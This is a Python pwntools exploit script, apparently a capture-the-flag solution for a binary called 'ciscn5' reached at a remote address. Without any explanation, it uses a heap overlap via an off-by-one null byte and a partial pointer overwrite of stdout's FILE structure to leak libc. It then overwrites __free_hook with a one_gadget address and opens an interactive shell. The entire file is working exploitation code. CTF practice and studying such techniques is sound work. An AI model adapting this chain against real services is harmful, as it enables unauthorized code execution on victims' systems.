from pwn import *
import sys
context.log_level = 'debug'
#context.update(arch='amd64',os='linux',timeout=1) 
#context.terminal = ['terminator','-x','sh','-c']
binary = './ciscn5' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("101.200.53.148", 34521)
elf=ELF(binary)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass

def add(size,idx,content):
    p.recvuntil(">>>")
    p.sendline("1")
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("len:")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)
def free(index):
    p.recvuntil(">>>")
    p.sendline("2")
    p.recvuntil("idx:")
    p.sendline(str(index))



#z("b *0x555555554bd2\nb *0x555555554cb0\n")
add(0x4f8,0,"a") # 0
add(0x30,1,"a") # 1
add(0x40,2,"a") # 2
add(0x50,3,"a") # 3
add(0x60,4,"a") # 4
add(0x4f8,5,"a") # 5
add(0x10,6,"a") # 6
free(4)
add(0x68,4,"a"*0x60+p64(0x660)+'\x00') # 4
#gdb.attach(p)
free(2)
free(0)
free(5)

add(0x530,0,"a")

free(4)

add(0xa0,2,"\x60\xa7")

add(0x40,5,"a")

payload = p64(0xfbad1800) + p64(0)*3 + "\x00"
add(0x3f,6,payload)


addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success("addr==>" + hex(addr))
libc_base = addr - 0x3ed8b0
log.success("libc_base==>" + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
realloc = libc_base + libc.sym['realloc']
one = libc_base + 0x4f322

log.success("malloc_hook==>" + hex(malloc_hook))
log.success("free_hook==>" + hex(free_hook))
log.success("system==>" + hex(system))
add(0x70,10,p64(free_hook))
add(0x60,11,"/bin/sh\x00")
add(0x60,12,p64(one))
free(5)
p.interactive()